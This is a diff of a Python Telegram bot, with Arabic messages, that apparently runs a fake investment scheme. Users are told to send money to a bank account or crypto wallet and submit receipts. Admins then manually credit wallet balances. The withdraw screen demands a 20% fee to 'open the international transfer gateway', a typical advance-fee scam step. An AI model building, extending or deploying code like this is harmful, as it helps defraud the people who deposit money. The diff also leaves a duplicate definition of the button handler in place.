@@ -121,20 +121,78 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try: await context.bot.send_message(chat_id=int(t), text=" ❌ تم رفض الإيصال من قبل الإدارة.")
             except: pass
 
+# --- دالة معالجة الأزرار (إصلاح أزرار المالك) ---
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    uid = query.from_user.id
+    await query.answer()
+
+    if data == 'main':
+        await start(update, context)
+    elif data == 'wallet':
+        u = get_user_data(uid)
+        text = f"📊 **تفاصيل محفظتك:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`"
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
+    elif data == 'withdraw':
+        u = get_user_data(uid)
+        msg = f"📤 **إجراءات سحب الأرباح:**\n\n🇸🇦 رصيدك: `{u['bal_sar']:,}` ريال\n🇺🇸 رصيدك: `{u['bal_usd']:,}` دولار\n\n💡 الرسوم (20%) لفتح بوابة التحويل الدولي."
+        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
+    elif data in ['c_sr', 'c_us']:
+        curr = 'sr' if data == 'c_sr' else 'us'
+        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
+        btns = [[InlineKeyboardButton(f"{p} {'ريال' if curr=='sr' else '$'}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
+        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
+        await query.edit_message_text(f"🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))
+    elif data.startswith(('s_', 'u_')):
+        amt = data.split('_')[1]
+        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
+        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')
+    
+    # --- إصلاح أزرار المالك (التأكيد والرفض) ---
+    elif data.startswith('ok_'):
+        if uid not in ADMINS_LIST: return
+        # تقسيم البيانات: ok, العملة, المبلغ, ايدي المستخدم
+        _, curr, amt, target_id = data.split('_')
+        try:
+            update_balance(int(target_id), curr, float(amt))
+            await query.edit_message_caption(caption=f"✅ تم تأكيد الإيداع بمبلغ {amt} {curr}\nتمت الإضافة للمحفظة.")
+            await context.bot.send_message(chat_id=int(target_id), text=f"🎉 تم إيداع `{amt}` {curr} في محفظتك بنجاح!")
+        except Exception as e:
+            logger.error(f"خطأ في إضافة الرصيد: {e}")
+            await query.answer("❌ حدث خطأ أثناء إضافة الرصيد")
+
+    elif data.startswith('no_'):
+        if uid not in ADMINS_LIST: return
+        target_id = data.split('_')[1]
+        await query.edit_message_caption(caption="❌ تم رفض هذا الإيصال.")
+        try:
+            await context.bot.send_message(chat_id=int(target_id), text="❌ تم رفض الإيصال من قبل الإدارة.")
+        except: pass
+
+# --- دالة استقبال الصور (أزرار المالك الكاملة) ---
 async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.photo:
         user = update.effective_user
         await update.message.reply_text("✅ تم استلام الإيصال، جاري المراجعة...")
-        # أزرار المالك الكاملة والمفصلة
-        def b(v, c): return InlineKeyboardButton(f"➕ {v} {('ر' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
+        
+        # دالة مساعدة لصنع الأزرار بنفس مبالغ الكود الأصلي
+        def b(v, c): return InlineKeyboardButton(f"➕ {v} {('﷼' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
+        
         kb = [
-            [b("1000", "sr"), b("1500", "sr")], [b("2000", "sr"), b("3000", "sr")],
-            [b("5000", "sr"), b("10000", "sr")], [b("20000", "sr"), b("50000", "sr")],
-            [b("300", "us"), b("500", "us")], [b("1000", "us"), b("5000", "us")],
+            [b("1000", "sr"), b("1500", "sr")],
+            [b("2000", "sr"), b("3000", "sr")],
+            [b("5000", "sr"), b("10000", "sr")],
+            [b("300", "us"), b("500", "us")],
+            [b("1000", "us"), b("5000", "us")],
             [InlineKeyboardButton("❌ رفض الإيصال", callback_data=f"no_{user.id}")]
         ]
+        
         for adm in ADMINS_LIST:
-            try: await context.bot.send_photo(chat_id=adm, photo=update.message.photo[-1].file_id, caption=f"🔔 إيداع من: {user.first_name}\nID: `{user.id}`", reply_markup=InlineKeyboardMarkup(kb))
+            try:
+                await context.bot.send_photo(chat_id=adm, photo=update.message.photo[-1].file_id, 
+                                           caption=f"🔔 إيداع جديد من: {user.first_name}\nID: `{user.id}`", 
+                                           reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
             except: pass
 
 if __name__ == '__main__':
